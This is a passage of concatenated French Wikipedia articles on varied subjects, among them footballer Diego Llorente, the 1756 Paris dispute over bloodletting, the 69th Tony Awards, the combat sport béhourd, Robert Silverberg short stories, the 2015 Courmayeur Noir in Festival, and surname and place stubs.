Transféré à Leeds United en septembre 2020 avec un contrat de quatre ans contre une indemnité de 20 millions d'euros, le Real Madrid récupérant 30% de la plus-value, Diego Llorente joue son premier match en "Premier League" le 5 décembre 2020, lors d'un déplacement sur la pelouse de Chelsea (défaite 3-1). Il marque son 1 but dans ce championnat le 19 avril 2021, contre Liverpool, permettant à son équipe d'arracher le match nul.
Il fait partie de la liste de 24 joueurs établie par le sélectionneur Luis Enrique pour l'Euro 2020.
En juillet 2024, après un prêt à l'AS Rome qui ne valide pas l'option d'achat dont le club italien bénéficie, Diego Llorente s'engage pour quatre ans avec le Real Betis, l'indemnité de transfert est évaluée à environ trois millions d'euros. Pour sa première saison, il se révèle être le leader de la défense du club entraîné par Manuel Pellegrini. Une blessure en fin de saison à la jambe gauche l'empêche de prendre part à la finale de la Ligue Conférence perdue par son équipe 4-1 face à Chelsea.

</doc>
<doc id="9624136" url="https://fr.wikipedia.org/wiki?curid=9624136" title="Basilique Sainte-Marie">
Basilique Sainte-Marie

Basilique Sainte-Marie peut faire référence à :

</doc>
<doc id="9624137" url="https://fr.wikipedia.org/wiki?curid=9624137" title="Querelle médicale de 1756 en France sur la saignée">
Querelle médicale de 1756 en France sur la saignée

Querelle médicale de 1756 en France sur la saignée
Histoire.
En 1756 parut dans le "Journal œconomique" une lettre de M. X... à M. Le Camus, docteur-régent de la Faculté de Médecine de Paris : elle osait prôner l'émétique et déprécier les mérites de la saignée répétée dans le traitement des maladies aiguës, telles que les fluxions de poitrine. 
Pour les principes, la Faculté veillait : elle était réunie le pour délibérer sur l'admission des bacheliers qui venaient de passer l'examen de matière médicale, quand le "Journal œconomique" lui fut communiqué. 
Le doyen Chomel s'émeut, s'indigne, demande à l'assemblée de répudier sur le champ une doctrine aussi pernicieuse, et les docteurs fulminent une excommunication immédiate contre cette hérésie. La thèse incriminée est jugée un système funeste, contraire aux axiomes admis depuis Hippocrate, un système faux, erroné, né de l'ignorance et de l'inexpérience ; la saignée longue et copieuse est chaudement recommandée dans les maladies inflammatoires ; on décide de rechercher immédiatement le fauteur anonyme de l'hérésie et de publier sur l'heure, pour que nul n'en ignore, le décret de la très salutaire Faculté de médecine de Paris. 
L'auteur de la Lettre réclamait un compère qui voulût bien le dénoncer : le compère se trouva et fut Jacques Barbeu du Bourg; c'est à lui du moins que M. Pauly attribue la "Lettre à M. Ch***, doyen de la Faculté de médecine de Paris au sujet d'un décret du sur la nécessité des saignées réitérées, par M***, docteur régent de la même Faculté"; lettre qui parut le . 
Elle commence "par un éloge ironiquement pompeux de la vigilance du doyen contre toute atteinte à la saine doctrine et accuse le docteur Marteau d'être l'auteur de ces blasphèmes ; elle félicite Chomel d'avoir osé violer, pour en obtenir condamnation, les statuts de la Faculté et la promesse faite à l'inculpé de provoquer trois délibérations sur la question en litige; elle lui demande d'exécuter avec la dernière rigueur son décret vengeur; de rayer à tout jamais des œuvres d'Hippocrate les maximes où ce médicastre grec expose les contre-indications de la saignée, d'excommunier Sydenham, Boerhaave qui ordonne de laisser quelques forces aux malades, et Gesner qui osa guérir Haller d'une péripneumonie sans le phlébotomiser".
Ce libelle de douze pages eut quelque succès ; on en fit une deuxième édition de dix-neuf pages : médecins et philiatres se l'arrachaient, et Chomel, sur les épaules duquel Barbeu venait de lancer la robe de Purgon, fut couvert de ridicule et ne fut pas réélu aux élections décanales d'octobre. 
Barbeu resta sur ses positions et proclama sa conviction à tous présents et à venir en faisant placarder une affiche ainsi conçue : "M. Barbeu Dubourg, docteur en médecine de la Faculté de Paris cy-devant précepteur de Messieurs de Matignon et auteur de deux livres d'histoire nouvellement donnés au public avertit qu'il continue de traiter les fluxions de poitrine et autres maladies inflammatoires sans saignée. Il est protégé par le Frère Philippe, religieux apothicaire de la Charité, qui répond de ses succès."

</doc>
<doc id="9624142" url="https://fr.wikipedia.org/wiki?curid=9624142" title="Nikolay Balboshin">
Nikolay Balboshin

Nikolai Balboshin est un lutteur soviétique né le à Potsdam.
Il est le porte-drapeau de l'Union soviétique aux Jeux olympiques d'été de 1980.

</doc>
<doc id="9624146" url="https://fr.wikipedia.org/wiki?curid=9624146" title="Blue Crane Route (municipalité)">
Blue Crane Route (municipalité)



</doc>
<doc id="9624151" url="https://fr.wikipedia.org/wiki?curid=9624151" title="69e cérémonie des Tony Awards">
69e cérémonie des Tony Awards

La des Tony Awards a eu lieu le au Radio City Music Hall de New York et fut retransmise en direct à la télévision sur CBS. La cérémonie a récompensé les productions de Broadway en cours pendant la saison 2014-2015 et avant le .
Cérémonie.
Kristin Chenoweth et Alan Cumming ont présentés la cérémonie. Les Creative Arts Awards ont été présentés par Jessie Mueller et James Monroe Iglehart. Les Creative Arts Awards comprennent les prix du meilleur décorateur, éclairagiste, costumier et orchestration.
Présentateurs.
Lors de la soirée, plusieurs personnalités se sont relayées pour annoncer les noms des gagnants dont ; Jason Alexander, Rose Byrne, Bobby Cannavale, Anna Chlumsky, Bradley Cooper, Harry Connick, Jr., Misty Copeland, Bryan Cranston, Larry David, Taye Diggs, Sutton Foster, Jennifer Grey, Joel Grey, Neil Patrick Harris, Marg Helgenberger, Dulé Hill, Nick Jonas, Kiesza, Judith Light, Jennifer Lopez, Patina Miller, Joe Manganiello, Debra Messing, Jennifer Nettles, Jim Parsons, Bernadette Peters, David Hyde Pierce, Phylicia Rashad, Thomas Sadoski, Taylor Schilling, Amanda Seyfried, Sting, Corey Stoll, Kiefer Sutherland, Ashley Tisdale, Tommy Tune et Rita Wilson.
Prestations.
Lors de la soirée, plusieurs troupes ont présenté des extraits des comédies musicales à l'affiche. Parmi les comédies musicales représentées sur scène au cours de la soirée ; "An American in Paris", "Le Roi et moi", "On the Town", "On the Twentieth Century", "The Visit", "Fun Home", "Something Rotten!", "It Shoulda Been You", "Finding Neverland" et "Gigi".
Lors d'une séquence hommage, Josh Groban interpréta "You'll Never Walk Alone" de la comédie musicale "Carousel".
Palmarès.
Les nominations ont été annoncés le par Mary-Louise Parker et Bruce Willis.
Autres récompenses.
Le prix Tony Honors for Excellence in the Theatre a été décerné à Adrian Bryan-Brown (attaché de presse), Gene O'Donovan (fondateur du Hudson Scenic Studio) et à Arnold Abramson (décorateur et artiste peintre).
Le Special Tony Award pour l'ensemble de sa carrière a été décerné à Tommy Tune. Stephen Schwartz a reçu le prix Isabelle Stevenson Award.
The Cleveland Play House fut récompensé du Regional Theatre Tony Award. Le "Tony Honor for Excellence in Theatre Education" a été remis à Corey Mitchell, professeur de théâtre et metteur en scène de la Northwest School of the Arts, Charlotte, Caroline du Nord.
John Cameron Mitchell a reçu le Tony Award Special pour son retour dans "Hedwig and the Angry Inch".

</doc>
<doc id="9624152" url="https://fr.wikipedia.org/wiki?curid=9624152" title="Donehogawa">
Donehogawa



</doc>
<doc id="9624153" url="https://fr.wikipedia.org/wiki?curid=9624153" title="Béhourd (sport)">
Béhourd (sport)

Le béhourd est un sport de combat impliquant l'utilisation d'armes et d'armures issues du Moyen Âge.
Étymologie.
Le terme béhourd vient du vieux français. On trouve dans les textes anciens les formes "behort", "behourt", "behourd", "beort", "baort", "bohort", "bohurt", "bouhort", "bouhourd" désignant originellement un combat à la lance, puis au sens général, un "tournoi". Il provient du francique *"bihordôn" signifiant "espace clôturé (où se déroulent les tournois)".
Histoire.
La renaissance du béhourd date des années 1990 en Russie. Il s'est peu à peu développé dans les pays d'Europe de l'Est principalement en Biélorussie, en Russie et en Ukraine pour ensuite gagner le reste de l'Europe.
La principale compétition internationale est la Bataille des Nations de la ligue HMB dans laquelle s'affrontent les équipes nationales, mais également la ligue "International Medieval Combat Federation" (IMCF), qui est un autre championnat avec des catégories différentes.
La pratique contemporaine du béhourd a été importée en France par Edouard Eme, fondateur et président de (2011), devenue France Béhourd (2012) puis enfin Fédération française de béhourd (2014). Le premier tournoi a eu lieu à Azincourt en 2011.
Description.
Les armes et armures utilisées par un combattant doivent correspondre à des analogues historiques de la même région et de la même époque (du ), à 30 ans près.
Contrairement aux reconstitutions de batailles historiques, le béhourd est un sport régi par des règles et nécessite la présence d'arbitres.
Afin de réduire les blessures, le matériel est soigneusement vérifié avant les batailles, toutes les armes sont émoussées.
Il s'agit d'un sport de combat en duel ou en équipe, pendant les combats de masse, une équipe l'emporte quand elle met ses adversaires à terre. Une fois au sol, il faut attendre la fin du round. Un combat se livre en 2 rounds gagnants.
Entraînement et préparation.
Les séances d'entraînements sont conformes aux méthodes modernes d'entraînement pour un sport de combat moderne (lutte, MMA, boxe, judo). À cela s'ajoutent des entraînements spécifiques en armure. Le crossfit et le powerlifting sont aussi beaucoup utilisés.
Règles.
Il y a des règles internationales unifiées pour les batailles. Elles interdisent un certain nombre de techniques très traumatisantes (clés de bras et jambes) et règlementent l'admission des combattants et de leurs armes afin d'observer la fiabilité historique de l'équipement, et aussi à éliminer les blessures graves. En particulier sont interdits les coups d'estoc, qui pourraient passer la visière, ainsi que les coups derrière les genoux, aux pieds, à l'aine ou à la nuque.
En raison des règles de combat qui peuvent différer selon les pays, les premières règles unifiées ont été développées spécifiquement pour le championnat du monde : « Bataille des nations ».
Catégories.
Plusieurs catégories existent, avec un nombre de combattants égal dans chaque équipe. Il y a donc les catégories de duel (triathlon ou profight), de 5vs5 (HMB et IMCF), de 10vs10 (IMCF), de 12vs12 (HMB), de 16vs16 (IMCF), de 30vs30(HMB) (nouvelle catégorie pour 2019 en lieu et place du 21vs21) et 150vs150 (HMB). Il peut s'agir d'un combat « courtois », appelé aussi « Duel », dans lequel les projections au sol sont interdites, les coups de pied non comptabilisés et où seules les touches à l'épée comptent, ou bien d'un combat « non courtois », appelé aussi « Profight », pour lequel les projections au sol, coups de poing, pieds, coudes, genoux, boucliers et armes comptent, les coups une fois l'adversaire au sol étant aussi autorisés jusqu’à intervention de l'arbitre, toutes ces actions rapportant des points.
Le béhourd en France.
Le béhourd est régie en France par la Fédération française de béhourd. À la fin de l'année 2020, 31 clubs en métropole ainsi qu'un club localisé à Monaco sont affiliés à cette fédération. Les clubs sont mixtes, hormis trois clubs féminins.
Des événements et compétitions sont organisés ponctuellement par la Fédération française de béhourd ou les clubs affiliés. Ils permettent la conduite du championnat de France mais aussi de présenter l'activité au public.
Le béhourd dans les autres pays francophones.
En Suisse romande un club est actif en 2021, affilié à l'Association médiévale romande.
Une équipe existe également à Monaco ; celle-ci est affiliée à la fédération française.
Compétitions internationales.
14 pays ont participé aux compétitions internationales de la Buhurt League réparties en deux tournois internationaux qui sont le Buhurt Prime et le Buhurt Next.
Une troisième compétition nommée "Buhurt Ultima" fera son apparition en permettant aux meilleures équipes de la catégorie 12 vs 12 de s'affronter. 
Buhurt Prime.
Le Buhurt Prime et le Buhurt Next sont deux compétitions annuelles internationales organisées par la Buhurt League et regroupant les meilleurs clubs du monde.
À la fin de chaque saison, les 20 équipes qui ont accumulé le plus de points au sein de la Buhurt League obtiennent une invitation officielle pour participer aux tournois internationaux. Certains prestigieux tournois nommés" Buhurt Master" peuvent offrir une invitation au gagnant pour participer au Buhurt Prime comme ce fut le cas du "Torneo Medieval de Calaveras 2019 " tenu au Mexique remporté par ACM Mexico.
Le Buhurt Prime accueille les dix premières équipes. La première édition s'est déroulée le à Monaco.
À cause des restrictions liées à la pandémie de Covid-19 empêchant le tournoi Buhurt Prime 2022 de se dérouler à Monaco, cette édition devait se passer à Belgrade le , dans le même cadre qui a accueilli le Buhurt Next 2022.
En raison de la guerre d'Ukraine, le tournoi n'a pas eu lieu.
Le Buhurt Prime 2021 a été reporté à cause de la pandémie de Covid-19, les points accumulés par les équipes lors de la saison 2020-2021 sont reportés pour la saison 2021-2022.
Le Buhurt Prime 2020 s'est déroulé à Monaco et a accueilli dix équipes provenant de 7 pays différents au sein du chapiteau de Fontvieille. 
Cette année-là, les trois équipes russes se sont hissés aux trois premières places.
La première édition du Buhurt Prime s'est déroulée le à monaco. Elle a été remportée par l'équipe russe Bayard contre leur rival Bear Paw.
Buhurt Next.
Le Buhurt Next accueille les équipes classées de la à la et a pris place pour la première fois le à Laon.
À cause de la pandémie de Covid-19, les équipes Aquila Sequania et Primus n'ont pas pu participer au tournoi Buhurt Next 2022. 
À cause de la Pandémie de Covid-19, l'édition Buhurt Next 2021 a été annulé.
La première édition du Buhurt Next s'est déroulé le à Laon. 
Battle of the Nations.
La Bataille des Nations est le championnat du monde de béhourd (combat médiéval), qui s’est tenu pour la première fois en 2009, en Ukraine et se déroulant depuis cette date chaque année durant le mois d'avril, mai ou juin en Europe.

</doc>
<doc id="9624159" url="https://fr.wikipedia.org/wiki?curid=9624159" title="Boy Charlton">
Boy Charlton



</doc>
<doc id="9624168" url="https://fr.wikipedia.org/wiki?curid=9624168" title="Sergueï Yutkevich">
Sergueï Yutkevich



</doc>
<doc id="9624173" url="https://fr.wikipedia.org/wiki?curid=9624173" title="Mary Ann Müller">
Mary Ann Müller

Mary Ann Müller, née en 1819 ou 1820 à Londres, en Angleterre et morte le à Blenheim en Nouvelle-Zélande est une des premières féministes néo-zélandaise.
Biographie.
Mary Ann Müller naît en 1819 ou 1820 à Londres. En 1849, elle quitte l'Angleterre pour la Nouvelle-Zélande avec ses deux enfants. On ignore si elle est déjà veuve à ce moment ou si elle quitte son époux à cause de sa cruauté. Elle se remarie en 1851 avec un autre émigrant anglais, Stephen Lunn Müller et à cette date, il est certain que son premier époux est décédé. En 1864, elle rencontre la féministe anglaise Maria Rye en visite en Nouvelle-Zélande. Cette rencontre l'amène à s'intéresser aux mouvements féministes anglais et américains et à écrire des articles défendant les droits des femmes publiés dans le journal "Nelson Examiner". Elle signe sous le pseudonyme de Fémmina essentiellement pour ne pas nuire à son époux qui s'est lancé dans la politique et qui désapprouve ses positions.
En 1869 elle publie ', le premier texte à réclamer le droit de vote pour les femmes. Ce texte suscite beaucoup d'intérêt dont celui de John Stuart Mill. Bien que Mary Ann Müller refuse de devenir un personnage public pour ne pas gêner son époux (elle ne révèlera son identité qu'en 1898, sept ans après la mort de celui-ci) elle rencontre tout de même le premier ministre de la Nouvelle-Zélande William Fox. Selon le Brooklyn Museum le texte de loi ' est inspiré de nombre de ses idées. Elle meurt en 1901.

</doc>
<doc id="9624174" url="https://fr.wikipedia.org/wiki?curid=9624174" title="Brandscheid">
Brandscheid

Brandscheid peut faire référence à :

</doc>
<doc id="9624177" url="https://fr.wikipedia.org/wiki?curid=9624177" title="FNRJ">
FNRJ



</doc>
<doc id="9624186" url="https://fr.wikipedia.org/wiki?curid=9624186" title="French Prairie">
French Prairie



</doc>
<doc id="9624187" url="https://fr.wikipedia.org/wiki?curid=9624187" title="Potiomkine">
Potiomkine



</doc>
<doc id="9624188" url="https://fr.wikipedia.org/wiki?curid=9624188" title="Montejo de Arévalo">
Montejo de Arévalo

Montejo de Arévalo est une commune de la province de Ségovie dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9624192" url="https://fr.wikipedia.org/wiki?curid=9624192" title="El pintor Francisco de Goya">
El pintor Francisco de Goya

 (en français « Le peintre Francisco de Goya ») est une peinture réalisée en 1826 par Vicente López y Portaña. Ce portrait est l'un des tableaux les plus connus de l'artiste ainsi que l'un des portraits les plus connus représentant Goya.
Description.
Le portrait montre Francisco de Goya, âgé de 80 ans, assis et portant des pinceaux et une palette. Sur le chevalet à côté de lui, Vicente López y Portaña y a peint une dédicace : (« López à son ami Goya »).
Analyse.
Ce tableau est représentatif de l'art du peintre néoclassique Vicente López, portraitiste de la Cour de Ferdinand VII. Comme titulaire de ce poste, le peintre ne réalise que deux tableaux d'intérêt : le premier est un portrait d'un organise aveugle, , et l'autre est ce portrait de Goya, à qui il rend hommage.
Le peintre a profité d'un voyage de Goya à Madrid — Goya s'était exilé en France — entre mi-mai et début juillet 1826, pour le peindre. La vivacité qui se dégage du tableau tient au coup de pinceau libre et sans peaufiner de son auteur, ce qui change des tableaux qui lui sont habituellement commandés. Le regard d'une forte expressivité de Goya contraste avec sa pose académique.
La volonté de Vicente López de rester fidèle au modèle ne déséquilibre pas le physique et la capture des matières, des textures et de la couleur : elle est compensée par 

</doc>
<doc id="9624193" url="https://fr.wikipedia.org/wiki?curid=9624193" title="L'Homme qui n'oubliait jamais">
L'Homme qui n'oubliait jamais

L'Homme qui n'oubliait jamais (titre original : ") est une nouvelle de science-fiction de Robert Silverberg. 
Publications.
Entre 1958 et 2014, la nouvelle a été éditée à vingt-sept reprises dans des recueils de nouvelles de Robert Silverberg ou des anthologies de science-fiction.
Publications aux États-Unis.
La nouvelle est parue en sous le titre " dans le magazine .
Elle a ensuite été régulièrement rééditée dans divers recueils de Robert Silverberg et diverses anthologies.
Publications en France.
La nouvelle est publiée en France :
Publication en Allemagne.
La nouvelle est parue en Allemagne en 1976 sous le titre "Der Mann mit dem Computergehirn".
Résumé.
Tom Niles a un don terrible, celui de ne jamais oublier ce qu'il a vu ou entendu, ni les personnes qu'il a croisées ou rencontrées. Sa vie est un enfer, il ne cesse de changer de villes, de travail, de vie, pour fuir les autres et se fuir lui-même. 
Un jour, retournant voir sa mère, il apprend que son grand-père était comme lui et qu'il avait fait face avec courage à ce don mystérieux : le tout est de savoir l’apprivoiser et d'en tirer le meilleur parti. Avec allégresse, Tom Niles prend conscience qu'il lui sera possible de vivre une vie normale.

</doc>
<doc id="9624198" url="https://fr.wikipedia.org/wiki?curid=9624198" title="From Death to Destiny">
From Death to Destiny

 est le troisième album du groupe de metalcore Asking Alexandria sorti le .
Il est le dernier album, à ce jour, avec Danny Worsnop en tant que vocaliste, remplacé par Denis Shaforostov de 2015 à 2016 avant de rejoindre le groupe a nouveau.

</doc>
<doc id="9624199" url="https://fr.wikipedia.org/wiki?curid=9624199" title="Anastasia Romanovna Zakharine">
Anastasia Romanovna Zakharine



</doc>
<doc id="9624204" url="https://fr.wikipedia.org/wiki?curid=9624204" title="Pirogov (film, 1947)">
Pirogov (film, 1947)



</doc>
<doc id="9624205" url="https://fr.wikipedia.org/wiki?curid=9624205" title="Noir in Festival 2015">
Noir in Festival 2015

La vingt-cinquième édition du Courmayeur Noir in Festival se déroule du au à Courmayeur. Le festival présente le meilleur du genre noir, du cinéma à la littérature, en passant par la télévision. Sept films étaient en avant-première pour le Lion noir.
Invités de marque.
Dario Argento, Gabriele Salvatores, Carlo Lucarelli, Maya Sansa, Luca Argentero et Teresa De Sio sont quelques-uns des invités qui animent le Courmayeur Noir in Festival, programmé aux pieds du Mont-Blanc.
Événements.
Avant-première mondiale du nouveau "X-Files".
Le festival accueille trois événements internationaux qui vont enrichir sa vingt-cinquième édition : le 11 décembre, la première mondiale du premier épisode de la , écrit par l'auteur de la série originale Chris Carter, avec le retour du couple David Duchovny et Gillian Anderson ; la projection de l'épisode "Immortality", qui conclura une des séries les plus longues de ces dernières années, "Les Experts" ; et comme film de clôture, l'avant-première italienne du film "Le Pont des espions", l'histoire d'espionnage de Steven Spielberg avec Tom Hanks.
Les deux directeurs Giorgio Gosetti et Marina Fabbri l'ont reconnu : Avoir la première mondiale de la est , qui la retransmettra ensuite en Italie à partir du 26 janvier 2016, juste après la première américaine.
La nouveauté de cette nouvelle saison s'appuie sur une réflexion prête à remettre en question tout ce en quoi les agents - et leurs fans - ont cru jusqu'à aujourd'hui : et si les responsables des phénomènes paranormaux, des enlèvements extraterrestres à tous les phénomènes inexpliqués, étaient non pas les extraterrestres, mais les êtres humains eux-mêmes ?
Avant-première italienne du remake de "Point Break".
Ce sera Courmayeur qui accueillera l'avant-première italienne de "Point Break", remake du film culte de 1991, réalisé par Kathryn Bigelow, avec Keanu Reeves et Patrick Swayze. Plusieurs scènes, comme la vertigineuse descente en snowboard sur les pentes enneigées, ont été tournées sur le Massif du Mont-Blanc et à Valgrisenche. L'avant-première - entre fin janvier et début février 2016 - s'inscrit dans un projet du Courmayeur Noir in Festival et de la Commission Film Vallée d'Aoste, qui, durant ces jours, feront découvrir les « panoramas » valdôtains aux jeunes producteurs italiens.
Jury.
Jury littéraire.
Le Jury littéraire du Courmayeur Noir in Festival 2015 est composé des membres suivants :
Sélection.
Finalistes pour le prix Scerbanenco.
Le prix Scerbanenco 2015 , promu par le Courmayeur Noir in Festival et le quotidien turinois La Stampa, récompense un roman noir italien paru cette année et choisi par le comité de sélection du Jury littéraire parmi ceux inscrits. 5 romans noir ont été sélectionnés parmi 21 :
Films en compétition.
Les sept films en compétition pour le "Lion noir" sont les suivants :
Films hors-compétition.
Le festival présente deux films hors concours :
Séries télévisées en compétition.
Les séries télévisées sélectionnées sont les suivantes :
Palmarès.
Prix littéraires.
C'est grâce à son style tranchant et ironique que Joe Lansdale a remporté cette année cette récompense qui est remise chaque année avant le début officiel du Festival. Auteur de plus de 40 romans et de centaines de récits, Lansdale est un auteur prolifique, capable de jongler entre la narrative pure et l'écriture d'un scénario. À cette occasion, l'écrivain texan a présenté son dernier roman, qui sort en avant-première mondiale pour Einaudi, "Honky Tonk Samurai", nouvelle aventure d'investigation pour les personnages de Hap Collins et de Léonard Pine. Influencé par Edgar Rice Burroughs, Mark Twain et Jack London, mais également par la littérature fantastique de Ray Bradbury et de Fredric Brown, par les bandes dessinées, les séries B et la littérature "pulp", Lansdale mêle humour désenchanté, fantaisie effrénée, et description impitoyable de la réalité dans ses aspects les plus cruels, les plus violents et les plus absurdes.
L'année dernière déjà, le prix était allé à un américain. C'était Jeffery Deaver, qui avait ajouté son propre nom à une liste prestigieuse, qui compte entre autres ceux de Don Winslow, de Michael Connelly, de Scott Turow, et de John le Carré. En 2013, le prix avait été attribué à Henning Mankell, disparu le 5 octobre dernier.
L'auteur de "Cosa resta di noi" a remporté le prix pour le meilleur roman noir italien. Le jury littéraire du Courmayeur Noir in Festival a décidé à la majorité d'attribuer à Giampaolo Simi le Prix Giorgio Scerbanenco - La Stampa 2015 avec la raison suivante : 
Outre Simi, les quatre autres finalistes étaient ("Città di polvere", Feltrinelli), Marcello Fois ("Luce perfetta", Einaudi), ("Il regno degli amici", Einaudi) et ("Senza ragione apparente", Feltrinelli). Cette dernière a obtenu une mention spéciale .
Prix cinématographique.
C'est au film , réalisé par Javier Ruiz Caldera, qu'est allé, cette année, le Lion noir, attribué par le public de Courmayeur avec 91,76 % des voix. Il s'agit d'une comédie dans laquelle un timide trentenaire découvre que son père est un insoupçonnable agent secret, elle tire son inspiration dune série d'histoires à succès des années 1960. Prix spécial pour "Into the forest" de Patricia Rozema. L'année dernière, le Lion noir avait été attribué à "Black Sea", avec Jude Law, sorti ensuite dans les salles au printemps.

</doc>
<doc id="9624207" url="https://fr.wikipedia.org/wiki?curid=9624207" title="Keele Peak">
Keele Peak



</doc>
<doc id="9624210" url="https://fr.wikipedia.org/wiki?curid=9624210" title="King Peak">
King Peak



</doc>
<doc id="9624216" url="https://fr.wikipedia.org/wiki?curid=9624216" title="Monterrubio">
Monterrubio

Monterrubio est une commune de la province de Ségovie dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9624223" url="https://fr.wikipedia.org/wiki?curid=9624223" title="Steffen Peters">
Steffen Peters

Steffen Peters, né le à Wesel, est un cavalier américain de dressage.
Carrière.
Aux Jeux olympiques d'été de 1996 à Atlanta, Steffen Peters se classe troisième de l'épreuve de dressage par équipe sur le cheval "Udon"; il termine quinzième de l'épreuve individuelle.
Aux Jeux olympiques d'été de 2008 à Pékin avec "Ravel", il termine quatrième de l'épreuve individuelle de dressage.
Aux Jeux olympiques d'été de 2012 à Londres toujours avec "Ravel", il termine dix-septième de l'épreuve individuelle de dressage et sixième avec l'équipe américaine.

</doc>
<doc id="9624240" url="https://fr.wikipedia.org/wiki?curid=9624240" title="Anastasia Zakharina">
Anastasia Zakharina



</doc>
<doc id="9624243" url="https://fr.wikipedia.org/wiki?curid=9624243" title="Jean-Baptiste Barsalou">
Jean-Baptiste Barsalou

 Jean-Baptiste Barsalou (né le et mort le ) était issu d'une famille d'affaires à Montréal, son père ayant été un maître tanneur avec sa propre entreprise à cet endroit.
En raison de la mort prématurée de son père, la famille de Jean-Baptiste fut morcelé et il tomba sous la garde d'un frère aîné qui a géré la tannerie et autres intérêts commerciaux de la famille. Jean a commencé sa vie professionnelle dans le commerce des fourrures comme un voyageur pour son oncle, Jean-Baptiste Neveu. Le début des années 1730, il avait repris la tannerie familiale et a conclu plusieurs ententes commerciales pour favoriser cette entreprise. En 1747, il avait étendu le commerce en achetant et en vendant les terres du Saint-Laurent.
La guerre de Sept Ans et le régime anglais subséquent a été dévastateur pour de nombreuses entreprises de l'époque et exploitations de Jean-Baptiste n'a pas fait exception. Au lieu de passer un grand domaine à son fils, ses avoirs ont presque tous disparu. Ses fils sont devenus des voyageurs et la tannerie Barsalou a cessé d'exister.
Référence.
https://www.biographi.ca/fr/bio.php?id_nbr=1747

</doc>
<doc id="9624244" url="https://fr.wikipedia.org/wiki?curid=9624244" title="Festival de chansons vivantes de Montauban et de Castelsarrasin">
Festival de chansons vivantes de Montauban et de Castelsarrasin



</doc>
<doc id="9624246" url="https://fr.wikipedia.org/wiki?curid=9624246" title="Nicolaï Komoliatov">
Nicolaï Komoliatov



</doc>
<doc id="9624258" url="https://fr.wikipedia.org/wiki?curid=9624258" title="Natalia Artemova">
Natalia Artemova



</doc>
<doc id="9624261" url="https://fr.wikipedia.org/wiki?curid=9624261" title="Natalia Artiomova">
Natalia Artiomova



</doc>
<doc id="9624263" url="https://fr.wikipedia.org/wiki?curid=9624263" title="Artiomov">
Artiomov

Patronymes.
Artiomov, Artemov ("masculin" ; ) ou Artiomova, Artemova ("féminin" ; ) est un patronyme russe porté par plusieurs personnalités (par ordre alphabétique) :

</doc>
<doc id="9624267" url="https://fr.wikipedia.org/wiki?curid=9624267" title="Artemov">
Artemov



</doc>
<doc id="9624269" url="https://fr.wikipedia.org/wiki?curid=9624269" title="Artyomov">
Artyomov



</doc>
<doc id="9624272" url="https://fr.wikipedia.org/wiki?curid=9624272" title="Artiomova">
Artiomova



</doc>
<doc id="9624273" url="https://fr.wikipedia.org/wiki?curid=9624273" title="Artemova">
Artemova



</doc>
<doc id="9624274" url="https://fr.wikipedia.org/wiki?curid=9624274" title="Artyomova">
Artyomova



</doc>
<doc id="9624282" url="https://fr.wikipedia.org/wiki?curid=9624282" title="Bakhmut">
Bakhmut



</doc>
<doc id="9624296" url="https://fr.wikipedia.org/wiki?curid=9624296" title="Astafiev">
Astafiev

Astafiev ("masculin" ; ) ou Astafieva ("féminin" ; ) est un patronyme russe porté par :

</doc>
<doc id="9624297" url="https://fr.wikipedia.org/wiki?curid=9624297" title="Astafyev">
Astafyev



</doc>
<doc id="9624298" url="https://fr.wikipedia.org/wiki?curid=9624298" title="Astafieva">
Astafieva



</doc>
<doc id="9624299" url="https://fr.wikipedia.org/wiki?curid=9624299" title="Astafyeva">
Astafyeva



</doc>
<doc id="9624306" url="https://fr.wikipedia.org/wiki?curid=9624306" title="Chronique DZ du Québec">
Chronique DZ du Québec

Les Chroniques DZ du Québec sont à l'origine une chronique vidéo de l’émission de télé "System DZ" diffusée sur la chaîne algérienne "Dzair TV" et crée par Malik Mehni.
Histoire.
La première diffusion de la chronique date de , après l’arrêt de l’émission "System DZ" en , les chroniques vidéo vont continuer à être diffusées sur le blog du "Al Huffington Post Algérie" en , puis celui du Québec 
Les chroniques vidéo mettent en avant la communauté algérienne du Québec à travers des entrevues de personnalités ou d'anonyme de la communauté. 

</doc>
<doc id="9624320" url="https://fr.wikipedia.org/wiki?curid=9624320" title="Salade olivier">
Salade olivier



</doc>
<doc id="9624325" url="https://fr.wikipedia.org/wiki?curid=9624325" title="Familles chérifiennes">
Familles chérifiennes



</doc>
<doc id="9624328" url="https://fr.wikipedia.org/wiki?curid=9624328" title="Il était une vieille femme">
Il était une vieille femme

Il était une vieille femme (titre original : ") est une nouvelle de science-fiction de Robert Silverberg.
Publications.
Entre 1958 et 2014, la nouvelle a été éditée à dix-huit reprises dans des recueils de nouvelles de Robert Silverberg ou des anthologies de science-fiction.
Publications aux États-Unis.
La nouvelle est parue en sous le titre " dans le magazine .
Elle a ensuite été régulièrement rééditée dans divers recueils de Robert Silverberg et diverses anthologies.
Publications en France.
La nouvelle est publiée en France :
Publication en Allemagne.
La nouvelle est parue en Allemagne en 1975 sous le titre "Mutter ist die Beste !".
Résumé.
Donna Mitchell a eu 31 enfants. Femme décidée et indomptable, elle a fixé pour chacun de ses enfants le métier qu'il exercerait plus tard : l'un serait peintre, l'autre avocat, le suivant historien, etc. Le problème essentiel est qu'elle n'a jamais compris que ses enfants ne voulaient pas nécessairement suivre les chemins qu'elle avait tracés pour eux.
Ses enfants, à l'occasion d'une réunion familiale, se confient les uns les autres et découvrent qu'ils sont tous frustrés professionnellement et ne sont pas heureux dans leurs métiers respectifs. Tous ensemble, ils empoisonnent leur mère et l'enterrent au fond d'un bois. Se promettant de garder le secret, ils se partagent les biens de la vieille femme et se séparent avec la ferme intention de vivre chacun les vies qu'ils auront choisies.

</doc>
<doc id="9624350" url="https://fr.wikipedia.org/wiki?curid=9624350" title="Vladimir Vyatkin">
Vladimir Vyatkin



</doc>
<doc id="9624353" url="https://fr.wikipedia.org/wiki?curid=9624353" title="Union des Artistes de Russie">
Union des Artistes de Russie



</doc>
<doc id="9624355" url="https://fr.wikipedia.org/wiki?curid=9624355" title="Rivière des Couture">
Rivière des Couture

La rivière des Couture est un affluent de la rive est de la rivière à la Scie laquelle coule vers l'ouest jusqu'à la rive sud du fleuve Saint-Laurent. Ce cours d'eau coule entièrement dans le territoire de la ville de Lévis, dans la région administrative de Chaudière-Appalaches, au Québec, au Canada.
Géographie.
Les principaux bassins versants voisins de la rivière des Couture sont :
